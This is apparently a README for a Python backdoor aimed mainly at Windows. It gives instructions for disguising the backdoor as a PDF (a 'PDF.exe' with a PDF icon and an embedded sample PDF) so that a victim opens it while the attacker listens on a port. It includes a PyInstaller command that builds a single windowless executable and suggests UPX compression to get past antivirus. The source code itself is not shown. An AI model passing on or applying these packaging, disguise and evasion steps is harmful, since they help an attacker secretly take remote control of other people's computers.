# Backdoor
This is a backdoor (Multi OS but focused more on wondows), 
Host must have opened the PDF.exe file located in the Desktop > Dist
Attacker must be listening to the port 
, Pyinstaller located in : 
C;\Users\username\AppData\Roaming\Python\Python321\Scripts\Pyinstaller.exe
This dosen't bypass the antivirus u can do it by using upx and compressing .exe file
Package this script into an executable file with PyInstaller and make sure to be packaged in windows computer
Pyinstaller.exe --add-data=location\\sample.pdf: .  -—onefile -—nonconsole --icon pdf.ico backdoor.py
